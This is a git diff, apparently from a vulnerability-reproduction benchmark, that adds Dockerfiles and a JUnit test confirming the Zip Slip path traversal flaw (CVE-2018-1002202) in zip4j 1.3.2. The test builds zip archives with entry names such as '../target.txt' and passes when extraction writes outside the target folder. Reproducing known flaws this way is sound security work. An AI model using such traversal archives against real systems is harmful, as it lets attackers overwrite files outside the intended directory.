diff --git a/.Dockerfile.backup b/.Dockerfile.backup
new file mode 100644
index 0000000..6a88f99
--- /dev/null
+++ b/.Dockerfile.backup
@@ -0,0 +1,17 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk-17.0.12 $WORKSPACE_BASE/java-env/jdk-17.0.12
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk-17.0.12/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk-17.0.12
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/srikanth-lingala__zip4j_CVE-2018-1002202_1.3.2 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
diff --git a/.build_diff.patch b/.build_diff.patch
new file mode 100644
index 0000000..8b13789
--- /dev/null
+++ b/.build_diff.patch
@@ -0,0 +1 @@
+
diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..48a6400
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,20 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk-17.0.12 $WORKSPACE_BASE/java-env/jdk-17.0.12
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk-17.0.12/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk-17.0.12
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/srikanth-lingala__zip4j_CVE-2018-1002202_1.3.2 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
+
+# Run the vulnerability test
+CMD mvn test -Dtest=PathTraversalVulnerabilityTest
diff --git a/src/test/java/net/lingala/zip4j/PathTraversalVulnerabilityTest.java b/src/test/java/net/lingala/zip4j/PathTraversalVulnerabilityTest.java
new file mode 100644
index 0000000..bdb01ca
--- /dev/null
+++ b/src/test/java/net/lingala/zip4j/PathTraversalVulnerabilityTest.java
@@ -0,0 +1,117 @@
+package net.lingala.zip4j;
+
+import org.junit.After;
+import org.junit.Before;
+import org.junit.Test;
+import org.junit.rules.TemporaryFolder;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+import static org.junit.Assert.assertTrue;
+
+public class PathTraversalVulnerabilityTest {
+
+    private TemporaryFolder temporaryFolder;
+    private File zipFile;
+    private File extractFolder;
+    private File targetFile;
+
+    @Before
+    public void setup() throws IOException {
+        temporaryFolder = new TemporaryFolder();
+        temporaryFolder.create();
+        
+        // Create a zip file with a malicious entry
+        zipFile = temporaryFolder.newFile("malicious.zip");
+        extractFolder = temporaryFolder.newFolder("extract");
+        
+        // Define a target file outside the extraction directory
+        targetFile = new File(temporaryFolder.getRoot(), "target.txt");
+        if (targetFile.exists()) {
+            targetFile.delete();
+        }
+        System.out.println("Target file path: " + targetFile.getAbsolutePath());
+        System.out.println("Extract folder path: " + extractFolder.getAbsolutePath());
+    }
+
+    @After
+    public void cleanup() {
+        if (targetFile.exists()) {
+            System.out.println("Target file exists after test! Vulnerability confirmed.");
+            try {
+                System.out.println("Target file content: " + new String(Files.readAllBytes(targetFile.toPath())));
+            } catch (IOException e) {
+                System.out.println("Could not read target file: " + e.getMessage());
+            }
+        } else {
+            System.out.println("Target file does not exist after test. Vulnerability not triggered.");
+        }
+        temporaryFolder.delete();
+    }
+
+    @Test
+    public void testPathTraversalVulnerability() throws IOException {
+        // Try multiple malicious patterns to test for the vulnerability
+        String[] maliciousPatterns = {
+            "../target.txt",
+            "..\\target.txt",
+            "extract/../target.txt",
+            "extract/../../target.txt",
+            "extract/subdir/../../target.txt",
+            ".//..//target.txt"
+        };
+        
+        boolean vulnerabilityExists = false;
+        
+        for (String pattern : maliciousPatterns) {
+            System.out.println("\nTesting pattern: " + pattern);
+            createMaliciousZipFile(pattern);
+            
+            try {
+                // Try to extract the zip file
+                ZipFile zipFile = new ZipFile(this.zipFile);
+                zipFile.extractAll(extractFolder.getAbsolutePath());
+                
+                // Check if the file was extracted outside the extraction directory
+                if (targetFile.exists()) {
+                    System.out.println("Vulnerability confirmed with pattern: " + pattern);
+                    vulnerabilityExists = true;
+                    break;
+                }
+                
+            } catch (Exception e) {
+                System.out.println("Exception during extraction: " + e.getMessage());
+                // If an exception is thrown, it might be because the vulnerability was fixed
+                // and the malicious entry was detected - this is good!
+            }
+        }
+        
+        // The test should FAIL if the vulnerability does not exist
+        // This is counter-intuitive, but we want the test to fail if the vulnerability is fixed
+        assertTrue("Path traversal vulnerability does not exist", vulnerabilityExists);
+    }
+
+    private void createMaliciousZipFile(String maliciousEntryName) throws IOException {
+        // Create a zip file with a path traversal entry
+        try (FileOutputStream fos = new FileOutputStream(zipFile);
+             ZipOutputStream zos = new ZipOutputStream(fos)) {
+            
+            System.out.println("Creating malicious entry: " + maliciousEntryName);
+            
+            ZipEntry zipEntry = new ZipEntry(maliciousEntryName);
+            zos.putNextEntry(zipEntry);
+            
+            // Write malicious content
+            byte[] content = "This is malicious content".getBytes();
+            zos.write(content, 0, content.length);
+            
+            zos.closeEntry();
+        }
+        System.out.println("Malicious zip file created at: " + zipFile.getAbsolutePath());
+    }
+}
